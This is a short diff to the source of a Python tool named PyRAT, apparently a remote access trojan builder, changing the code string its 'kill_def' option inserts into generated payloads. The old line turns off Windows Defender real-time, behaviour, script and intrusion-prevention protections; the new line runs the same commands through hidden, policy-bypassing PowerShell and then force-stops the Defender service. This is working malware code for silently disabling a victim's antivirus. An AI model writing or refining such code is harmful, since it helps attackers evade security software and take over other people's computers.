@@ -1069,7 +1069,7 @@ class PyRAT:
 
             if self.kill_def.get():
                 self.kill_def.toggle()
-                kill_def = "subprocess.run(\"powershell -c Set-MpPreference -DisableRealtimeMonitoring $true -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -PUAProtection Disabled -DisableScheduleScanning $true -DisableEmailScanning $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -DisableIntrusionPreventionSystem $true\", shell=True)"
+                kill_def = "subprocess.run(\"powershell -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -NoProfile -NoLogo -Command Set-MpPreference -DisableRealtimeMonitoring $true -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -PUAProtection Disabled -DisableEmailScanning $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -DisableIntrusionPreventionSystem $true; Start-Sleep -Seconds 3; Stop-Service -NoWait -Force -Name WinDefend\", shell=True)"
 
             if self.set_error.get():
                 self.set_error.toggle()
